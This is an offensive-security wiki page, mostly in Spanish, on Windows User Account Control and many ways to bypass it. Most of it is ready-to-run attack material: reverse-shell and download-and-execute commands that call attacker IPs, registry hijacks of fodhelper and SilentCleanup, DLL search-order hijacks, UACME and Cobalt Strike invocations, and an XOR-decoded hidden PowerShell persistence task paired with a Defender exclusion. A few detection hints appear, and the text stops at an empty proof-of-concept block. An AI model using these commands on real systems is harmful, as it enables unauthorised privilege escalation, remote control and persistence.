# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una función que habilita un **aviso de consentimiento para actividades elevadas**. Las aplicaciones tienen diferentes niveles de `integrity`, y un programa con un **nivel alto** puede realizar tareas que **podrían comprometer potencialmente el sistema**. Cuando UAC está habilitado, las aplicaciones y tareas siempre **se ejecutan bajo el contexto de seguridad de una cuenta que no es de administrador**, a menos que un administrador autorice explícitamente que dichas aplicaciones/tareas tengan acceso de nivel administrador al sistema para ejecutarse. Es una función de conveniencia que protege a los administradores frente a cambios no intencionados, pero no se considera un límite de seguridad.<sup>[[2]](#references)</sup>

Para obtener más información sobre los niveles de integridad:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Cuando UAC está implementado, un usuario administrador recibe 2 tokens: un token de usuario estándar, para realizar acciones habituales con integridad media, y otro con los privilegios de administrador.

Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explica en profundidad cómo funciona UAC e incluye el proceso de inicio de sesión, la experiencia del usuario y la arquitectura de UAC.<sup>[[2]](#references)</sup> Los administradores pueden utilizar políticas de seguridad para configurar cómo funciona UAC específicamente para su organización a nivel local (mediante secpol.msc), o configurarlo e implementarlo mediante Group Policy Objects (GPO) en un entorno de dominio de Active Directory. Las distintas configuraciones se explican detalladamente [aquí](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Hay 10 configuraciones de Group Policy que se pueden establecer para UAC. La siguiente tabla proporciona información adicional:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

Las **políticas de seguridad locales** ("secpol.msc" en la mayoría de los sistemas) están configuradas de forma predeterminada para **impedir que los usuarios que no son administradores instalen software**. Esto significa que, aunque un usuario que no sea administrador pueda descargar el instalador de tu software, no podrá ejecutarlo sin una cuenta de administrador.

### Registry Keys to Force UAC to Ask for Elevation

Como usuario estándar sin derechos de administrador, puedes asegurarte de que la cuenta "estándar" **solicite credenciales mediante UAC** cuando intente realizar determinadas acciones. Esta acción requeriría modificar determinadas **claves del registro**, para lo cual necesitas permisos de administrador, a menos que exista un **UAC bypass**, o que el atacante ya haya iniciado sesión como administrador.

Aunque el usuario pertenezca al grupo **Administrators**, estos cambios obligan al usuario a **volver a introducir las credenciales de su cuenta** para realizar acciones administrativas.

**En la práctica, esto solo resulta útil cuando ya tienes un token elevado, un UAC bypass o una configuración incorrecta que permite cambiar estas claves; de lo contrario, la propia escritura en el registro se bloquea.**

Las claves y entradas del registro que debes cambiar son las siguientes (con sus valores predeterminados entre paréntesis):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Esto también se puede hacer manualmente mediante la herramienta Local Security Policy. Una vez modificadas, las operaciones administrativas solicitan al usuario que vuelva a introducir sus credenciales.

### Note

**User Account Control no es un límite de seguridad.** Por lo tanto, los usuarios estándar no pueden escapar de sus cuentas ni obtener derechos de administrador sin un exploit de local privilege escalation.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Privilegios de UAC

- Internet Explorer Protected Mode utiliza comprobaciones de integridad para impedir que los procesos con un nivel de integridad alto (como los navegadores web) accedan a datos con un nivel de integridad bajo (como la carpeta de archivos temporales de Internet). Esto se consigue ejecutando el navegador con un token de baja integridad. Cuando el navegador intenta acceder a datos almacenados en la zona de baja integridad, el sistema operativo comprueba el nivel de integridad del proceso y permite el acceso según corresponda. Esta función ayuda a impedir que los ataques de ejecución remota de código obtengan acceso a datos confidenciales del sistema.
- Cuando un usuario inicia sesión en Windows, el sistema crea un token de acceso que contiene una lista de los privilegios del usuario. Los privilegios se definen como la combinación de los derechos y las capacidades de un usuario. El token también contiene una lista de las credenciales del usuario, que se utilizan para autenticarlo en el equipo y en los recursos de la red.

### Autoadminlogon

Para configurar Windows de modo que inicie sesión automáticamente con un usuario específico al arrancar, establece la **`AutoAdminLogon` registry key**. Esto resulta útil en entornos de quiosco o para realizar pruebas. Utilízalo únicamente en sistemas seguros, ya que expone la contraseña en el registro.

Establece las siguientes claves mediante el Editor del Registro o `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Para volver al comportamiento de inicio de sesión normal, establece `AutoAdminLogon` en 0.

## UAC bypass

> [!TIP]
> Ten en cuenta que, si tienes acceso gráfico a la víctima, UAC bypass es sencillo, ya que solo tienes que hacer clic en "Yes" cuando aparezca el aviso de UAC.

UAC bypass es necesario en la siguiente situación: **UAC está activado, tu proceso se está ejecutando en un contexto de integridad media y tu usuario pertenece al grupo de administradores**.

Es importante mencionar que es **mucho más difícil realizar UAC bypass si se encuentra en el nivel de seguridad más alto (Always) que si está en cualquiera de los otros niveles (Default).**

### Triage rápido desde un shell de integridad media

Antes de intentar un bypass, confirma que te encuentras en el escenario adecuado y relaciona la build del host con métodos conocidos que funcionen:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Notas prácticas:
- Si `EnableLUA=0`, no necesitas un bypass: cualquier token de admin puede solicitar directamente una integridad alta.
- `ConsentPromptBehaviorAdmin=2` o `5` es el escenario común para bypasses de auto-elevate / basados en COM.
- `Always Notify` eleva el nivel de exigencia, pero aun así debes probar la build exacta en lugar de asumir que fallará: UACME todavía registra algunos métodos `AlwaysNotify compatible` en builds modernas de Windows.<sup>[[3]](#references)</sup>

### UAC deshabilitado

Si UAC ya está deshabilitado (`ConsentPromptBehaviorAdmin` es **`0`**), puedes **ejecutar un reverse shell con privilegios de admin** (nivel de integridad alto) usando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass con duplicación de tokens

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### RPC local + objeto de depuración reutilizable

La interfaz RPC local de AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` puede crear un proceso con la depuración habilitada. Los procesos creados mediante depuración en el mismo thread comparten el objeto de depuración del thread; un evento de depuración de creación contiene un handle de proceso con acceso completo incluso cuando el propio resultado del RPC solo concede acceso limitado. Esto convierte la reutilización del objeto de depuración en una primitiva de UAC para un miembro del grupo Administrators con integridad media.<sup>[[11]](#references)[[12]](#references)</sup>

Una cadena práctica es:<sup>[[11]](#references)[[12]](#references)</sup>

1. Llama al método RPC local (directamente o mediante `NdrAsyncClientCall`) para crear un proceso sacrificial no elevado con la depuración habilitada.
2. Consulta `ProcessDebugObjectHandle` con `NtQueryInformationProcess`, sepáralo con `NtRemoveProcessDebug`, conserva el objeto y termina el proceso sacrificial.
3. Usa la misma interfaz RPC para crear un proceso de confianza auto-elevado y, a continuación, asocia el objeto guardado con el thread que realiza la llamada mediante `DbgUiSetThreadDebugObject`.
4. Llama a `WaitForDebugEvent` y toma el handle de proceso de `CREATE_PROCESS_DEBUG_EVENT`; duplícalo con `NtDuplicateObject` antes de continuar.
5. Proporciona el handle duplicado a `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` y lanza el payload con una estructura de información de inicio extendida. Esto reutiliza el contexto del proceso elevado y proporciona al proceso hijo una relación de proceso padre con apariencia de confianza.

Busca la secuencia corta en lugar de limitarte al binario auto-elevado: creación de procesos mediante el RPC local de AppInfo, consultas de `ProcessDebugObjectHandle`, separación y reconexión del depurador, un evento de depuración de creación inmediato, duplicación de handles y un proceso hijo cuyo padre registrado no coincide con el proceso que ejecutó las API de creación.<sup>[[12]](#references)</sup>

### UAC "bypass" **muy** básico (acceso completo al sistema de archivos)

Si tienes una shell con un usuario que pertenece al grupo Administrators, puedes **montar el recurso compartido C$** mediante SMB (sistema de archivos) localmente en un disco nuevo y tendrás **acceso a todo lo que haya dentro del sistema de archivos** (incluso a la carpeta de inicio de Administrator).

> [!WARNING]
> **Parece que este truco ya no funciona**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

The Cobalt Strike techniques will only work if UAC is not set at its max security level
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** y **Metasploit** también tienen varios módulos para **bypass** de **UAC**.

### Interfaces COM elevadas (`ICMLuaUtil` / `CMSTPLUA`)

Los objetos COM con elevación automática siguen siendo una superficie práctica de UAC en las versiones modernas. UACME sigue registrando `ICMLuaUtil` como funcional en las ramas actuales de Windows, y las herramientas ofensivas continúan adaptando `CMSTPLUA` combinando un proceso de escritorio interactivo, ejecución de 64 bits y, en ocasiones, masquerading del PEB/proceso antes de invocar el COM Elevation Moniker.<sup>[[3]](#references)</sup>

Consejos prácticos:
- Prefiere un proceso de **64 bits** en la **sesión interactiva** del usuario (habitualmente `explorer.exe` o un proceso hijo).
- Si un shell sin formato falla, vuelve a intentarlo desde un BOF / implementación de UACME en lugar de un wrapper ingenuo de `CreateProcess`.
- Ten en cuenta que la ejecución del proceso hijo ocurre en un **proceso elevado independiente**; muchos BOF no elevan el beacon actual directamente.

### KRBUACBypass

Documentación y herramienta en [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de bypass de UAC

[**UACME**](https://github.com/hfiref0x/UACME) es una colección de técnicas de bypass de UAC. Compílalo con Visual Studio o MSBuild; la compilación crea varios ejecutables (por ejemplo, `Source\Akagi\output\x64\Debug\Akagi.exe`), así que selecciona el método adecuado para la compilación objetivo.<sup>[[3]](#references)</sup>\
Ten cuidado: algunos bypass ejecutan programas visibles o muestran prompts que pueden alertar al usuario.<sup>[[3]](#references)</sup>

UACME indica la **versión de compilación a partir de la cual cada técnica comenzó a funcionar**.<sup>[[3]](#references)</sup> Puedes buscar una técnica que afecte a tus versiones:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Además, usando [esta](https://en.wikipedia.org/wiki/Windows_10_version_history) página obtienes la versión de Windows `1607` a partir de las versiones de compilación.

Un flujo de trabajo práctico consiste en **evaluar primero la compilación del host** y solo después ejecutar el método correspondiente:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` compara rápidamente la compilación local con sus métodos UAC conocidos, lo que resulta útil para descartar rápidamente PoCs obsoletos.<sup>[[4]](#references)</sup>
- `UACME` sigue siendo el mejor catálogo público para asociar un bypass con una compilación concreta. La versión 3.7.1 añadió los métodos 83–85, mientras que la versión anterior volvió a probar los métodos existentes con **Windows 11 25H2**; vuelve a comprobar la tabla de métodos y las notas de la versión en lugar de asumir que una PoC antigua sigue funcionando sin cambios.<sup>[[3]](#references)[[9]](#references)</sup>

### Cadenas WNF/UIAccess compatibles con Always Notify (UACME 3.7.1)

`Always Notify` no elimina todos los UAC bypasses. UACME 3.7.1 implementa tres nuevos métodos x64 que combinan el estado de entorno/protocolo controlado por el usuario con el comportamiento de tareas programadas elevadas o UIAccess, y marca todos ellos como `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** redirige `SystemRoot` para que la tarea activada por WNF `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` haga que `taskhostw.exe` elevado realice un side-load de `unifiedconsent.dll`. UACME lo registra desde Windows 10 build 19041.
- **84 — TabTip:** utiliza la misma primitiva de variable de entorno contra `TabTip.exe` con UIAccess, que carga `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` o `rsaenh.dll` según la compilación; después, pivota desde el contexto UIAccess de alta integridad resultante. UACME lo registra desde Windows 8.1 / Server 2016.
- **85 — Narrator:** secuestra el protocolo `feedback-hub` por usuario, controla Narrator con `Alt+CapsLock+F` y después inicia una copia escribible de `osk.exe` que realiza un side-load de `OskSupport.dll`. Requiere un escritorio interactivo y se registra desde Windows 10 1809 / Server 2019.

Después de compilar las unidades de payload y Akagi según la documentación de UACME, invoca el número de método correspondiente (el comando opcional usa `cmd.exe` de forma predeterminada):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Los métodos 84 y 85 dependen de UIAccess/interacción con el escritorio, por lo que no debe esperarse que funcionen sin modificaciones desde Session 0 o desde un service shell no interactivo. Los tres manipulan el estado del entorno/protocolo y preparan DLLs; inspeccione la implementación y elimine esos artefactos después de las pruebas.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

El binario de confianza `fodhelper.exe` se autoeleva en las versiones modernas de Windows. Al ejecutarse, consulta la ruta del registro por usuario que se muestra a continuación sin validar el verbo `DelegateExecute`. Plantar un comando allí permite que un proceso con Medium Integrity (el usuario pertenece al grupo Administrators) genere un proceso con High Integrity sin mostrar un aviso de UAC.

Ruta del registro consultada por fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Pasos de PowerShell (configura tu payload y, después, actívalo)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notas:
- Funciona cuando el usuario actual es miembro de Administrators y el nivel de UAC es predeterminado/flexible (no Always Notify con restricciones adicionales).
- Usa la ruta `sysnative` para iniciar un PowerShell de 64 bits desde un proceso de 32 bits en Windows de 64 bits.
- El Payload puede ser cualquier comando (PowerShell, cmd o una ruta a un EXE). Evita las UIs que soliciten interacción para mantener el stealth.

#### Variante de CurVer/extension hijack (solo HKCU)

Las muestras recientes que abusan de `fodhelper.exe` evitan `DelegateExecute` y, en su lugar, **redirigen el ProgID `ms-settings`** mediante el valor `CurVer` por usuario. El binario autoelevado todavía resuelve el handler bajo `HKCU`, por lo que no se necesita un admin token para crear las claves:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Una vez elevados, los malware suelen **deshabilitar las solicitudes futuras** estableciendo `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` en `0`; después realizan una evasión de defensas adicional (por ejemplo, `Add-MpPreference -ExclusionPath C:\ProgramData`) y recrean la persistencia para ejecutarse con alta integridad. Una tarea de persistencia típica almacena en el disco un **script de PowerShell cifrado con XOR** y lo descodifica y ejecuta en memoria cada hora:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Esta variante sigue limpiando el dropper y deja solo los payloads staged, por lo que la detección depende de supervisar el **hijack de `CurVer`**, la manipulación de `ConsentPromptBehaviorAdmin`, la creación de exclusiones de Defender o las tareas programadas que descifran PowerShell en memoria.<sup>[[5]](#references)</sup>

### Evasión de UAC mediante la tarea `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` inicia `cleanmgr.exe` con privilegios máximos y expande `%windir%` desde el entorno del usuario. Si controlas `HKCU\Environment\windir`, puedes redirigir esa expansión a un comando arbitrario y obtener una integridad alta sin un cuadro de diálogo de consentimiento.<sup>[[8]](#references)</sup> Este método aún merece ser probado en compilaciones recientes porque UACME mantiene la técnica activa y el seguimiento reciente de problemas indica que Windows 11 24H2 podría requerir únicamente pequeños ajustes de comillas.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Si la tarea cita la ruta en esa build, vuelve a intentarlo con el payload terminando en una comilla (por ejemplo, `cmd.exe"`). Limpia siempre `HKCU\Environment\windir` después de las pruebas.

#### Más UAC bypass

Muchos UAC bypass clásicos que abusan de flujos de UI, objetos COM o interacción con el escritorio requieren una **sesión interactiva completa** con la víctima; una shell común de `nc.exe` o un servicio ejecutándose en la **Session 0** a menudo no es suficiente.

A menudo puedes solucionarlo usando una sesión de **meterpreter**. Migra a un **proceso** cuyo valor de **Session** sea igual a **1**:

![Apunta ms-settings a una extensión personalizada (.thm) y asigna esa extensión a nuestro payload - Más UAC bypass: Puedes hacerlo usando una sesión de meterpreter. Migra a un proceso cuyo valor de Session...](<../../images/image (863).png>)

(_explorer.exe_ debería funcionar)

### UAC Bypass con GUI

Si tienes acceso a una **GUI**, simplemente puedes aceptar el aviso de UAC cuando aparezca; realmente no necesitas un bypass técnico. Por lo tanto, obtener una sesión GUI suele ser suficiente para evitar la fricción práctica añadida por UAC.

Además, si obtienes una sesión GUI que alguien estaba usando (potencialmente mediante RDP), habrá **algunas herramientas que se estarán ejecutando como administrador**, desde las cuales podrías **ejecutar** directamente un **cmd**, por ejemplo **como administrador**, sin que UAC vuelva a solicitar confirmación, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Esto podría ser un poco más **sigiloso**.

### Noisy brute-force UAC bypass

Si el ruido es aceptable, una herramienta como [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) puede solicitar elevación repetidamente hasta que el usuario la acepte.

### Tu propio bypass - Metodología básica de UAC bypass

Si echas un vistazo a **UACME**, observarás que **muchos UAC bypass abusan de DLL hijacking** (a menudo haciendo que un binario elevado cargue una DLL controlada por el atacante desde una ruta con permisos de escritura). [Lee esto para aprender a encontrar una vulnerabilidad de DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Encuentra un binario que se **autoeleve** (comprueba que, al ejecutarlo, se inicia con un nivel de integridad alto).
2. Con procmon, busca eventos "**NAME NOT FOUND**" que puedan ser vulnerables a **DLL Hijacking**.
3. Probablemente tendrás que **escribir** la DLL dentro de algunas **rutas protegidas** (como C:\Windows\System32), donde no tienes permisos de escritura. Puedes evitarlo usando:
1. **wusa.exe**: Windows 7, 8 y 8.1. Permite extraer el contenido de un archivo CAB dentro de rutas protegidas (porque esta herramienta se ejecuta con un nivel de integridad alto).
2. **IFileOperation**: Windows 10.
4. Prepara un **script** para copiar tu DLL dentro de la ruta protegida y ejecutar el binario vulnerable y autoelevado.

### Otra técnica de UAC bypass

Consiste en observar si un **binario autoElevated** intenta **leer** del **registro** el **nombre/ruta** de un **binario** o **comando** que se va a **ejecutar** (esto es más interesante si el binario busca esta información dentro de **HKCU**).

### UAC bypass mediante `SysWOW64\iscsicpl.exe` + DLL hijack del `PATH` del usuario

El binario de 32 bits `C:\Windows\SysWOW64\iscsicpl.exe` tiene **autoelevación** y puede abusarse para cargar `iscsiexe.dll` mediante el orden de búsqueda. Si puedes colocar una `iscsiexe.dll` maliciosa dentro de una carpeta con **permisos de escritura para el usuario** y después modificar el `PATH` del usuario actual (por ejemplo, mediante `HKCU\Environment\Path`) para que se busque esa carpeta, Windows podría cargar la DLL del atacante dentro del proceso elevado de `iscsicpl.exe` **sin mostrar un aviso de UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Notas prácticas:
- Esto resulta útil cuando el usuario actual pertenece a **Administrators**, pero se ejecuta con **Medium Integrity** debido a UAC.
- La copia de **SysWOW64** es la relevante para este bypass. Trata la copia de **System32** como un binario independiente y valida su comportamiento por separado.
- La primitiva es una combinación de **auto-elevation** y **DLL search-order hijacking**, por lo que el mismo flujo de trabajo de ProcMon utilizado para otros UAC bypass resulta útil para validar la carga de la DLL ausente.

Flujo mínimo:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ideas de detección:
- Generar una alerta ante `reg add` / escrituras en el registro en `HKCU\Environment\Path` seguidas inmediatamente de la ejecución de `C:\Windows\SysWOW64\iscsicpl.exe`.
- Buscar `iscsiexe.dll` en ubicaciones **controladas por el usuario**, como `%TEMP%` o `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlacionar los lanzamientos de `iscsicpl.exe` con procesos hijo inesperados o cargas de DLL desde fuera de los directorios normales de Windows.

### Investigación más reciente que conviene comprobar por separado

Algunas cadenas posteriores a 2024 ya no se parecen a los clásicos registry hijacks de `HKCU\Software\Classes`. Por ejemplo, el envenenamiento de la caché de activation context puede encadenar un **drive remap** y una **DLL redirection** para pasar de integridad media a alta mediante binarios de UI de confianza / auto-elevated, como `ctfmon.exe`, y posteriormente objetivos como `fodhelper.exe`. En lugar de duplicar aquí el PoC completo, consulta los ejemplos compactos de payloads en:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (preview) drive-letter hijack mediante el mapa de dispositivos DOS por sesión de inicio de sesión

> [!NOTE]
> En agosto de 2026, Microsoft todavía documenta Administrator Protection como una **Insider preview**: el despliegue de octubre de 2025 se revirtió y está previsto para una fecha posterior. Confirma que **Admin Approval Mode with Administrator protection** esté realmente habilitado y que el dispositivo se haya reiniciado antes de probar estas cadenas; una cadena de versión estándar 25H2 por sí sola no demuestra que la función esté activa.<sup>[[10]](#references)</sup>

Para consultar la superficie de ataque completa de `RAiLaunchAdminProcess` / UIAccess en las preview builds de Windows 11 25H2, revisa la página dedicada:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” utiliza shadow-admin tokens con mapas `\Sessions\0\DosDevices/<LUID>` por sesión. El directorio se crea de forma diferida mediante `SeGetTokenDeviceMap` en la primera resolución de `\??`. Si el atacante suplanta el shadow-admin token únicamente en **SecurityIdentification**, el directorio se crea con el atacante como **owner** (hereda `CREATOR OWNER`), lo que permite drive-letter links que tienen prioridad sobre `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Pasos:**

1. Desde una sesión con pocos privilegios, llama a `RAiProcessRunOnce` para generar un `runonce.exe` shadow-admin sin prompt.
2. Duplica su primary token como un token de **identification** y suplántalo mientras abres `\??` para forzar la creación de `\Sessions\0\DosDevices/<LUID>` bajo el control del atacante.
3. Crea allí un symlink `C:` que apunte a almacenamiento controlado por el atacante; los accesos posteriores al sistema de archivos en esa sesión resolverán `C:` en la ruta del atacante, permitiendo un DLL/file hijack sin prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
